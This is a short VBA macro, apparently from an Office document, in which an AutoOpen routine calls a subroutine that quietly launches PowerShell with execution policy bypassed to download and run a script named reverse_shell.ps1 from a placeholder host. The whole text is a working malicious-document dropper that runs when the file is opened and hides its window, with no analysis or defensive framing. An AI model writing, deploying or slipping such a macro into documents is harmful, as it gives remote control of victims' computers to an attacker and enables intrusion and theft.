Sub TestMacro()
'
' TestMacro Macro
'
'
cmd = "powershell.exe -exec bypass -c iex(new-object net.webclient).downloadstring('http://hosting_address/reverse_shell.ps1')"
exec = Shell(cmd, vbHide)

End Sub

Sub AutoOpen()
    TestMacro
End Sub
